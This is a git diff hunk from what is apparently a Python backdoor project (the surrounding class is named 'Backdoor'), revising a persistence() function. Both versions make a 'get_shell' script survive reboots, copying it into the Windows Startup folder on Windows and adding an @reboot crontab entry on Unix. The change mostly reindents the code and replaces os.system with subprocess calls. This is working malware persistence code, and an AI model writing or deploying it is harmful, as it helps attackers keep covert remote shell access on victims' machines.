@@ -110,21 +110,28 @@ class Backdoor:
 
 ### only for Windows, Unix inc soon ###
 def persistence():
-	if os.name == 'nt':
-		script_path = "C:\\Users\\$PATH\\get_shell.py"
-		startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-		startup_file = os.path.join(startup_dir, "get_shell.pyw")
+    if os.name == 'nt':
+        script_path = "C:\\Users\\$PATH\\get_shell.py"
+        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        startup_file = os.path.join(startup_dir, "get_shell.pyw")
 
-		if not os.path.isfile(startup_file) or os.stat(script_path).st_mtime > os.stat(startup_file).st_mtime:
-		# copy get_shell script to the startup directory
-			shutil.copyfile(script_path, startup_file)
-	else:
-		script_path = os.path.abspath('get_shell.py')
-		cron_job = f"@reboot python3 {script_path} &"
-		current_crontab = os.popen('crontab -l').read()
-		if cron_job not in current_crontab:
-			os.system(f"(crontab -l ; echo '{cron_job}') | crontab -")
-
+        if not os.path.isfile(startup_file) or os.stat(script_path).st_mtime > os.stat(startup_file).st_mtime:
+            # copy get_shell script to the startup directory
+            shutil.copyfile(script_path, startup_file)
+    else:
+        script_path = "/path/to/your/get_shell.py"  # Set to your script path in Unix-based system
+        cron_line = "@reboot python3 {}\n".format(script_path)
+        
+        # The subprocess.run() function is used to run the given command.
+        result = subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
+        current_crontab = result.stdout.decode()
+        
+        if cron_line not in current_crontab:
+            # Adds the task to the crontab, if it's not already there.
+            with open("mycron", "a") as cron_file:
+                cron_file.write(cron_line)
+            subprocess.run(['crontab', 'mycron'])
+            os.remove("mycron")
 
 
 
